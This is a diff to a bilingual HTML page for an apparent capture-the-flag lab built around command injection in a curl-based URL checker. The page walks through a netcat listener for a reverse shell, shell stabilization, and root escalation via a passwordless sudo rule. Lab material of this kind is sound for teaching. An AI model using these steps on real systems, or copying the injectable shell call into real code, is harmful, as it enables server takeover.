@@ -10,13 +10,16 @@
         <p class="text-sm text-gray-600 dark:text-gray-400 mb-3">
           Esta herramienta de diagnóstico comprueba la disponibilidad de una URL remota ejecutando
           <code>curl</code> en el servidor. El parámetro URL se pasa sin sanitizar a la shell.
-          Consigue una reverse shell en el servidor.
+          El proceso corre como el usuario <strong>admin</strong> (sin privilegios de root).
+          Consigue una reverse shell y luego escala privilegios hasta <code>root</code>.
         </p>
       </div>
       <div class="lang-content" data-lang="en" style="display:none">
         <p class="text-sm text-gray-600 dark:text-gray-400 mb-3">
           This diagnostic tool checks remote URL availability by running <code>curl</code> on the server.
-          The URL parameter is passed unsanitized to the shell. Get a reverse shell on the server.
+          The URL parameter is passed unsanitized to the shell.
+          The process runs as the <strong>admin</strong> user (no root privileges).
+          Get a reverse shell and then escalate privileges to <code>root</code>.
         </p>
       </div>
     </div>
@@ -53,8 +56,12 @@
         <span class="lang-content" data-lang="en" style="display:none">Receive the connection with <code>nc -lvnp 4444</code> on your attacker machine.</span>
       </li>
       <li>
-        <span class="lang-content" data-lang="es">Estabilizar la shell y leer <code>/etc/passwd</code>.</span>
-        <span class="lang-content" data-lang="en" style="display:none">Stabilize the shell and read <code>/etc/passwd</code>.</span>
+        <span class="lang-content" data-lang="es">Confirmar que eres <code>admin</code> con <code>id</code> y leer <code>/home/admin/user.txt</code>.</span>
+        <span class="lang-content" data-lang="en" style="display:none">Confirm you are <code>admin</code> with <code>id</code> and read <code>/home/admin/user.txt</code>.</span>
+      </li>
+      <li>
+        <span class="lang-content" data-lang="es">Escalar privilegios hasta <code>root</code> y leer <code>/root/root.txt</code>.</span>
+        <span class="lang-content" data-lang="en" style="display:none">Escalate privileges to <code>root</code> and read <code>/root/root.txt</code>.</span>
       </li>
     </ul>
   </div>
@@ -63,9 +70,9 @@
 <div id="resolution-data" class="hidden">
   <div class="lang-content" data-lang="es">
     <h3>Concepto</h3>
-    <p>El servidor ejecuta <code>curl -s -o /dev/null -w '%{http_code}' --max-time 5 URL</code> con <code>shell=True</code>.
-    Cualquier separador de comandos en la URL se interpreta por la shell, permitiendo ejecutar código arbitrario.
-    Como el proceso inicia la conexión saliente hacia el atacante, no se necesita acceso entrante al servidor.</p>
+    <p>El servidor ejecuta <code>su -s /bin/sh admin -c "curl -s -o /dev/null -w '%{http_code}' --max-time 5 URL"</code> con <code>shell=True</code>.
+    Cualquier separador de comandos en la URL se interpreta por la shell de <code>admin</code>, permitiendo ejecutar código arbitrario.
+    La reverse shell llega como <strong>admin</strong> (UID 1000), no como root — es necesario escalar privilegios para leer <code>/root/root.txt</code>.</p>
 
     <h3>Paso 0 — Preparar el listener</h3>
     <p>En tu máquina atacante (Kali / máquina con acceso de red al servidor), antes de enviar el payload:</p>
@@ -111,15 +118,33 @@ stty raw -echo; fg
 export TERM=xterm
 stty rows 40 cols 170</pre>
 
+    <h3>Escalada de privilegios</h3>
+    <p>La shell llega como <code>admin</code>. Para escalar a root:</p>
+    <pre># Confirmar usuario actual
+id
+# uid=1000(admin) gid=1000(admin) ...
+
+# Comprobar sudo
+sudo -l
+# (ALL) NOPASSWD: ALL
+
+# Escalar a root
+sudo su -
+# o bien
+sudo bash
+
+# Leer la flag de root
+cat /root/root.txt</pre>
+
     <h3>Herramientas</h3>
-    <div><span class="tools-badge">netcat</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">bash</span> <span class="tools-badge">python3</span> <span class="tools-badge">perl</span></div>
+    <div><span class="tools-badge">netcat</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">bash</span> <span class="tools-badge">python3</span> <span class="tools-badge">perl</span> <span class="tools-badge">sudo</span></div>
   </div>
 
   <div class="lang-content" data-lang="en" style="display:none">
     <h3>Concept</h3>
-    <p>The server runs <code>curl -s -o /dev/null -w '%{http_code}' --max-time 5 URL</code> with <code>shell=True</code>.
-    Any command separator in the URL is interpreted by the shell, allowing arbitrary code execution.
-    Since the process initiates an outbound connection to the attacker, no inbound access to the server is required.</p>
+    <p>The server runs <code>su -s /bin/sh admin -c "curl -s -o /dev/null -w '%{http_code}' --max-time 5 URL"</code> with <code>shell=True</code>.
+    Any command separator in the URL is interpreted by <code>admin</code>'s shell, allowing arbitrary code execution.
+    The reverse shell lands as <strong>admin</strong> (UID 1000), not root — privilege escalation is required to read <code>/root/root.txt</code>.</p>
 
     <h3>Step 0 — Set up the listener</h3>
     <p>On your attacker machine (Kali / machine with network access to the server), before sending the payload:</p>
@@ -165,8 +190,26 @@ stty raw -echo; fg
 export TERM=xterm
 stty rows 40 cols 170</pre>
 
+    <h3>Privilege escalation</h3>
+    <p>The shell lands as <code>admin</code>. To escalate to root:</p>
+    <pre># Confirm current user
+id
+# uid=1000(admin) gid=1000(admin) ...
+
+# Check sudo rights
+sudo -l
+# (ALL) NOPASSWD: ALL
+
+# Escalate to root
+sudo su -
+# or
+sudo bash
+
+# Read the root flag
+cat /root/root.txt</pre>
+
     <h3>Tools</h3>
-    <div><span class="tools-badge">netcat</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">bash</span> <span class="tools-badge">python3</span> <span class="tools-badge">perl</span></div>
+    <div><span class="tools-badge">netcat</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">bash</span> <span class="tools-badge">python3</span> <span class="tools-badge">perl</span> <span class="tools-badge">sudo</span></div>
   </div>
 </div>
 {% endblock %}
